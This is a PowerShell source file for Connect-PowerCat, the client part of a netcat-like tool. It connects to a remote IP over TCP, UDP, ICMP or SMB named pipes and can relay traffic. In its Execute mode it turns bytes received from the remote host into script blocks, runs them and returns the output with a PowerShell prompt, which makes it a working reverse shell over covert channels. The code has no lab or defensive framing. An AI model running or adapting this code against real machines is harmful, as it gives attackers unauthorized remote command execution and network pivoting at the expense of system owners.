function Connect-PowerCat {
[CmdletBinding(DefaultParameterSetName = 'Console')]
    Param (
        [Parameter(Position = 0, Mandatory = $true)]
        [Alias("m")]
        [ValidateSet('Icmp', 'Smb', 'Tcp', 'Udp')]
        [String]$Mode,

        [Parameter(Position = 1, Mandatory = $true)]
        [ValidatePattern("^(([0-9]|[1-9][0-9]|1[0-9]{2}|2[0-4][0-9]|25[0-5])\.){3}([0-9]|[1-9][0-9]|1[0-9]{2}|2[0-4][0-9]|25[0-5])$")]
        [Alias("c")]
        [String]$RemoteIp,
        
        [Parameter(ParameterSetName = 'Execute')]
        [Alias('e')]
        [Switch]$Execute,
    
        [Parameter(ParameterSetName = 'Input')]
        [Alias("i")]
        [Object]$Input,
        
        [Parameter(ParameterSetName = 'Relay')]
        [Alias("r")]
        [String]$Relay,
    
        [Parameter()]
        [Alias("t")]
        [Int]$Timeout = 60,
    
        [Parameter()]
        [Alias("o")]
        [ValidateSet('Bytes','String')]
        [String]$OutputType = 'Bytes',

        [Parameter()]
        [Alias("of")]
        [String]$OutputFile = "",
    
        [Parameter()]
        [Alias("d")]
        [Switch]$Disconnect,
    
        [Parameter()]
        [Alias("rep")]
        [Switch]$Repeat,
        
        [Parameter()]
        [ValidateSet('Ascii','Unicode','UTF7','UTF8','UTF32')]
        [String]$Encoding = 'Ascii'
    )       
    DynamicParam {
        $ParameterDictionary = New-Object Management.Automation.RuntimeDefinedParameterDictionary
        
        switch ($Mode) {
           'Icmp' { $BindParam = New-RuntimeParameter -Name BindAddress -Type String -Mandatory -Position 1 -ParameterDictionary $ParameterDictionary -ValidatePattern "^(([0-9]|[1-9][0-9]|1[0-9]{2}|2[0-4][0-9]|25[0-5])\.){3}([0-9]|[1-9][0-9]|1[0-9]{2}|2[0-4][0-9]|25[0-5])$" ; continue }
            'Smb' { $PipeNameParam = New-RuntimeParameter -Name PipeName -Type String -Mandatory -ParameterDictionary $ParameterDictionary ; continue }
            'Tcp' { $PortParam = New-RuntimeParameter -Name Port -Type Int -Mandatory -Position 1 -ParameterDictionary $ParameterDictionary ; continue }
            'Udp' { $PortParam = New-RuntimeParameter -Name Port -Type Int -Mandatory -Position 1 -ParameterDictionary $ParameterDictionary ; continue }
        }

        if ($Execute.IsPresent) { 
            $ScriptBlockParam = New-RuntimeParameter -Name ScriptBlock -Type ScriptBlock -ParameterDictionary $ParameterDictionary 
            $ArgumentListParam = New-RuntimeParameter -Name ArgumentList -Type Object[] -ParameterDictionary $ParameterDictionary 
        }

        return $ParameterDictionary
    }
    Begin {         
        switch ($Encoding) {
            'Ascii' { $EncodingType = New-Object Text.AsciiEncoding ; continue }
          'Unicode' { $EncodingType = New-Object Text.UnicodeEncoding ; continue }
             'UTF7' { $EncodingType = New-Object Text.UTF7Encoding ; continue }
             'UTF8' { $EncodingType = New-Object Text.UTF8Encoding ; continue }
            'UTF32' { $EncodingType = New-Object Text.UTF32Encoding ; continue }
        }

        if ($ParameterDictionary.ScriptBlock.Value) {
            
            Write-Verbose "Executing scriptblock..."

            $ScriptBlock = $ParameterDictionary.ScriptBlock.Value
            
            $Error.Clear()
            
            $BytesToSend += $EncodingType.GetBytes(($ScriptBlock.Invoke($ParameterDictionary.ArgumentList.Value) | Out-String))
            if ($Error) { foreach ($Err in $Error) { $BytesToSend += $EncodingType.GetBytes($Err.ToString()) } }
            $BytesToSend += $EncodingType.GetBytes(("`nPS $((Get-Location).Path)> "))
            
            $ScriptBlock = $null
        }
      
        elseif ($PSCmdlet.ParameterSetName -eq 'Input') {   
            
            Write-Verbose 'Parsing input...'

            if ((Test-Path $Input)) { $BytesToSend = [IO.File]::ReadAllBytes($Input) }     
            elseif ($Input.GetType() -eq [Byte[]]) { $BytesToSend = $Input }
            elseif ($Input.GetType() -eq [String]) { $BytesToSend = $EncodingType.GetBytes($Input) }
            else { Write-Warning 'Incompatible input type.' ; exit }
        }

        elseif ($PSCmdlet.ParameterSetName -eq 'Relay') {
            
            Write-Verbose "Setting up relay stream..."

            $RelayConfig = $Relay.Split(':')

            if ($RelayConfig.Count -eq 2) { # Listener
                
                $RelayMode = $RelayConfig[0].ToLower()

                switch ($RelayMode) {
                   'icmp' { $RelayStream = New-IcmpStream -BindAddress $RelayConfig[1] ; continue }
                    'smb' { $RelayStream = New-SmbStream -PipeName $RelayConfig[1] ; continue }
                    'tcp' { $RelayStream = New-TcpStream -Port $RelayConfig[1] ; continue }
                    'udp' { $RelayStream = New-UdpStream -Port $RelayConfig[1] ; continue }
                    default { Write-Warning 'Invalid relay mode specified.' ; exit }
                }
            }
            elseif ($RelayConfig.Count -eq 3) { # Client
                
                $RelayMode = $RelayConfig[0].ToLower()

                switch ($RelayMode) {
                   'icmp' { $RelayStream = New-IcmpStream -RemoteIp $RelayConfig[2] -BindAddress $RelayConfig[1] ; continue }
                    'smb' { $RelayStream = New-SmbStream -RemoteIp $RelayConfig[2] -PipeName $RelayConfig[1] ; continue }
                    'tcp' { $RelayStream = New-TcpStream -RemoteIp $RelayConfig[2] -Port $RelayConfig[1] ; continue }
                    'udp' { $RelayStream = New-UdpStream -RemoteIp $RelayConfig[2] -Port $RelayConfig[1] ; continue }
                    default { Write-Warning 'Invalid relay mode specified.' ; exit }
                }
            }
            else { Write-Error 'Invalid relay format.' -ErrorAction Stop }
        }
          
        Write-Verbose "Setting up network stream..."

        $ServerIp = [Net.IPAddress]::Parse($RemoteIp)

        switch ($Mode) {
           'Icmp' { 
                try { $ClientStream = New-IcmpStream $ServerIp -BindAddress $ParameterDictionary.BindAddress.Value }
                catch { Write-Warning "Failed to open Icmp stream. $($_.Exception.Message)" ; exit }
                continue 
            }
            'Smb' { 
                try { $ClientStream = New-SmbStream $ServerIp -PipeName $ParameterDictionary.PipeName.Value  }
                catch { Write-Warning "Failed to open Smb stream. $($_.Exception.Message)" ; exit }
                continue 
            }
            'Tcp' { 
                try { $ClientStream = New-TcpStream $ServerIp $Port }
                catch { Write-Warning "Failed to open Tcp stream. $($_.Exception.Message)" ; exit }
                continue 
            }
            'Udp' { 
                try { $ClientStream = New-UdpStream $ServerIp $Port }
                catch { Write-Warning "Failed to open Udp stream. $($_.Exception.Message)" ; exit }
            }
        }
      
        if ($BytesToSend.Count) { Write-NetworkStream -Mode $Mode -Stream $ClientStream -Bytes $BytesToSend }
        
        [console]::TreatControlCAsInput = $true
    }
    Process {           

        while ($true) {
            
            if ($Disconnect.IsPresent) { Write-Verbose 'Disconnect specified, exiting.' ; break }

            # Catch Ctrl+C / Read-Host
            if ([console]::KeyAvailable) {          
                $Key = [console]::ReadKey($true)
                if (($Key.Modifiers -band [ConsoleModifiers]::Control) -and ($Key.Key -eq 'C')) {
                    Write-Warning 'Caught escape sequence, stopping PowerCat.'
                    break
                }
                if ($PSCmdlet.ParameterSetName -eq 'Console') { 
                    Write-Host -NoNewline $Key.KeyChar
                    $BytesToSend = $EncodingType.GetBytes($Key.KeyChar + (Read-Host) + "`n") 
                    Write-NetworkStream -Mode $Mode -Stream $ClientStream -Bytes $BytesToSend
                }
            }

            # Get data from the network
            if ($ClientStream.Socket.Available) { $ReceivedBytes = Read-NetworkStream -Mode $Mode -Stream $ClientStream -Size $ClientStream.Socket.Available }
            elseif ($ClientStream.InBufferSize) { $ReceivedBytes = Read-NetworkStream -Mode $Mode -Stream $ClientStream -Size $ClientStream.InBufferSize }
            else { continue }

            # Redirect received bytes
            if ($PSCmdlet.ParameterSetName -eq 'Execute') {
            
                $ScriptBlock = [ScriptBlock]::Create($EncodingType.GetString($ReceivedBytes))
            
                $Error.Clear()

                $BytesToSend += $EncodingType.GetBytes(($ScriptBlock.Invoke() | Out-String))
                if ($Error) { foreach ($Err in $Error) { $BytesToSend += $EncodingType.GetBytes($Err.ToString()) } }
                $BytesToSend += $EncodingType.GetBytes(("`nPS $((Get-Location).Path)> "))
            
                $ScriptBlock = $null

                if ($BytesToSend.Count) { 
                    Write-NetworkStream -Mode $Mode -Stream $ClientStream -Bytes $BytesToSend 
                    $BytesToSend = $null
                }
                continue
            }
            elseif ($PSCmdlet.ParameterSetName -eq 'Relay') { 
                Write-NetworkStream -Mode $RelayMode -Stream $RelayStream -Bytes $ReceivedBytes 
                continue
            }
            elseif ($PSBoundParameters.OutputFile) { 
                if ($OutputType -eq 'Bytes') { 
                    $FileStream = New-Object IO.FileStream -ArgumentList @($OutputFile,[IO.FileMode]::Append)
                    [void]$FileStream.Seek(0, [IO.SeekOrigin]::End) 
                    $FileStream.Write($ReceivedBytes, 0, $ReceivedBytes.Length) 
                    $FileStream.Flush() 
                    $FileStream.Dispose() 
                    continue
                }
                elseif ($OutputType -eq 'String') { $EncodingType.GetString($ReceivedBytes) | Out-File -Append -FilePath $OutputFile ; continue }
            }
            else { # StdOut
                if ($OutputType -eq 'Bytes') { Write-Output $ReceivedBytes }
                elseif ($OutputType -eq 'String') { Write-Output $EncodingType.GetString($ReceivedBytes) }
            }
        }
    }
    End {   
        [console]::TreatControlCAsInput = $false
      
        try { Close-NetworkStream -Mode $Mode -Stream $ClientStream }
        catch { Write-Warning "Failed to close client stream. $($_.Exception.Message)" }

        if ($PSCmdlet.ParameterSetName -eq 'Relay') {
            try { Close-NetworkStream -Mode $RelayMode -Stream $RelayStream }
            catch { Write-Warning "Failed to close relay stream. $($_.Exception.Message)" }
        }
    }
}